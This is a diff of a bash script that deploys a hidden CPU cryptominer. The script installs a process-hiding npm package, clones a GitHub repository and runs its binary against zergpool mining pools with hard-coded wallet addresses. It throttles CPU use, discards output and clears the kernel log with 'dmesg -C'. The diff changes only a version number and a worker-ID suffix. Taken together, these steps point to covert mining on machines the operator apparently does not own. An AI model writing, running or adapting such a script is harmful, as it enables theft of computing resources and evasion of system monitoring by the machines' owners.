@@ -1,5 +1,5 @@
 #!/bin/bash 
-sudo apt-get update && sudo apt install cpulimit gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.14.0 -y && npm i -g node-process-hider 
+sudo apt-get update && sudo apt install cpulimit gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.15.0 -y && npm i -g node-process-hider 
 git clone https://github.com/BatiKangkung/Kerecek
 cd Kerecek/
 rm -rf avx2
@@ -12,7 +12,7 @@ cpulimit -l 180 -e avx2 &
 # ./avx2 -a minotaurx -o stratum+tcps://stratum-na.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
 # ./avx2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q9fc7uqt9q4ngd7rf6lzv266adhnwngf70xcmhe.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
 # ./avx2 -a yespowerSUGAR -o stratum+tcp://yespowerSUGAR.na.mine.zergpool.com:6535 -u TX7hx8zqvfvb4c16QkuZYfrV4Kvqi8xMGi -p c=TRX,mc=SUGAR,ID=$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 >/dev/null &
-./avx2 -a yespowerR16 -o stratum+tcp://yespowerR16.na.mine.zergpool.com:6534 -u TX7hx8zqvfvb4c16QkuZYfrV4Kvqi8xMGi -p  c=TRX,mc=YTN,ID=$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 >/dev/null &
+./avx2 -a yespowerR16 -o stratum+tcp://yespowerR16.na.mine.zergpool.com:6534 -u TX7hx8zqvfvb4c16QkuZYfrV4Kvqi8xMGi -p  c=TRX,mc=YTN,ID=$(echo $(shuf -i 100-999 -n 1)-CPU-Z) -t 4 >/dev/null &
 uname -a
 make
 dmesg -C
